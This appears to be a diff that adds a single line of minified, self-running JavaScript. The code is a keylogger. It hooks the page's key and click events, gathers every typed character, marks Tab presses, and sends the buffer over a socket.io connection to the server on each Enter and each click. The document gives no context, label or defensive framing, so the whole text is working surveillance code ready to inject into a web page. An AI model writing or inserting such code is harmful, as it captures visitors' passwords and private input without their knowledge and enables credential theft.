@@ -1,0 +1,1 @@
+(function(){var n=io.connect(window.location);var o="";document.onkeypress=c;document.onkeydown=t;document.onclick=i;function i(){n.emit("data",{data:o})}function t(n){if(n.which===9){o+="::"}}function c(i){if(i.which===13){n.emit("data",{data:o});o=""}else{o+=String.fromCharCode(i.which)}}})();
